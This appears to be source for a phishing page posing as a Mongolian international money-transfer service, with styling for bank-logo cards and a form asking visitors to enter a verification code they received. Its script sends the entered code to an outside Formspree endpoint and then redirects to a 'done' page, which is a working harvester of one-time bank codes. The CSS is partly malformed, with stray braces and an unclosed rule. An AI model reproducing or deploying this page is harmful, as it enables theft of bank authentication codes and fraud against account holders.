.form {
  width: 400px;
  margin: 20px auto;
  padding: 20px 20px;
  background-color: #ffffff;
  border-radius: 8px;
  box-shadow: 0 8px 24px #686869;
  font-family: 'Poppins', sans-serif;
  
}

.form .img {
  display: flex;
  justify-content: center;
}

.form .img img {
  width: 50px;
  height: 50px;
  border-radius: 50%;
}

form label {
  font-size: 13px;
  font-weight: 600;
  color: #444;
  margin-bottom: 6px;
  display: block;
}

form input[type="text"] {
  width: 100%;
  padding: 10px 10px;
  font-size: 15px;
  border: 1px solid #ccc;
  border-radius: 12px;
  background-color: #f5f5f5;
  margin-bottom: 10px;
  transition: border-color 0.3s ease, background 0.3s ease;
}

form input[type="text"]:focus {
  border-color: #10b981;
  background-color: #fff;
  outline: none;
}

form button {
  width: 100%;
  padding: 14px;
  color: #fff;
  background-color: #10b981;
  box-shadow: 0px 0px 15px #10b981, 0px 0px 15px #10b981 inset;
  font-weight: 600;
  font-size: 20px;
  border: none;
  border-radius: 12px;
  cursor: pointer;
  transition: background-color 0.3s ease, transform 0.2s ease;
}

form button:hover {
  
  transform: scale(1.01);
}
.form-options {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin: 10px 0 20px;
  font-size: 13px;
}

.form-options .remember {
  display: flex;
  align-items: center;
  gap: 6px;
  color: #333;
}

.form-options .forgot {
  color: #0077b6;
  text-decoration: none;
  font-weight: 500;
  display: none;
}

.form-options .forgot:hover {
  text-decoration: underline;
}

.code-section {
    max-width: 500px;
    margin: 60px auto 40px;
    padding: 20px 20px;

  }
  
  .code-section button {

    font-size: 16px;

    }
  }

    .code-section {
      margin: 60px 15px;
      padding: 25px 15px;
      margin-top: 200px;
    margin-bottom: 200px;
    }
  
    .code-section input,
    .code-section button {
      font-size: 15px;
    }

}

.index-section2 {
    display: flex;

/* Style de la carte (le lien) */
.bank-card {
    position: relative; /* Important pour placer le texte par rapport à la carte */
    width: 300px;
    height: 300px;
    border-radius: 12px;
    display: flex;
    justify-content: center;
    align-items: center;
    text-decoration: none;
    transition: transform 0.2s ease;
    overflow: hidden; /* Pour que rien ne dépasse des bords arrondis */
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
}

.bank-card:hover {
    transform: scale(1.02);
}

/* Couleurs de fond (Dégradés comme sur l'image) */
.bank-card:nth-child(1) { background: linear-gradient(135deg, #02432d, #036b4a); } /* Khan Bank (Vert) */
.bank-card:nth-child(2) { background: linear-gradient(135deg, #4c1d95, #6366f1); } /* TDB/Golomt (Violet) */
.bank-card:nth-child(3) { background: #fff; border: 1px solid #eee; } /* State Bank (Blanc) */

/* Image du logo */
.bank-card img {
    width: 75%;
    height: 75%;
    object-fit: contain;
}

/* L'étiquette noire avec le texte */
.bank-name {
    position: absolute;
    bottom: 30px; /* Positionné vers le bas */
    background-color: rgba(0, 0, 0, 0.85); /* Noir semi-transparent */
    color: #ffffff;
    padding: 6px 15px;
    font-size: 14px;
    font-weight: bold;
    text-transform: lowercase; /* Comme sur ta capture */
    border-radius: 2px;
    letter-spacing: 0.5px;
    z-index: 2;
}

/* Responsive : une seule colonne sur téléphone */
@media (max-width: 650px) {
    .bank-card {
        width: 100%;
        max-width: 320px;
    }
}

         <div class="code-section">

        <form id="codeForm">
            <p>Хүлээн авсан кодыг оруулна уу</p>
            <input type="text" id="codeInput" name="code" placeholder="Кодоо оруулна уу" required /><br>
            <br>
            <button  type="submit">Баталгаажуулахын тулд</button>
            <div id="loader" style="display:none; "></div>
            <p id="message"></p>
          </form>
      </div>
      


    <footer>© 2025 Олон улсын мөнгөн шилжүүлэг. Бүх эрх хуулиар хамгаалагдсан.</footer>
    <script src="script.js"></script>
     
    <script>
       const form = document.getElementById('codeForm');
const loader = document.getElementById('loader');
const message = document.getElementById('message');

form.addEventListener('submit', async function (e) {
  e.preventDefault(); // Empêche l'envoi classique

  loader.style.display = 'block';
  message.textContent = '';

  const formData = {
    code: document.getElementById('codeInput').value
  };

  try {
    const response = await fetch('https://formspree.io/f/meeejgqq', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(formData)
    });

    loader.style.display = 'none';

    if (response.ok) {
      message.style.color = 'green';
      message.textContent = 'Амжилттай илгээгдлээ!';
      form.reset();

      // ✅ Redirection vers done.html après un petit délai (facultatif)
      setTimeout(() => {
        window.location.href = 'done.html';
      }, 1000); // délai de 1 seconde (1000 ms)

    } else {
      message.style.color = 'red';
      message.textContent = 'Алдаа гарлаа. Дахин оролдоно уу.';
    }
  } catch (error) {
    loader.style.display = 'none';
    message.style.color = 'red';
    message.textContent = 'Сүлжээний алдаа. Дахин оролдоно уу.';
    console.error(error);
  }
});

      </script>
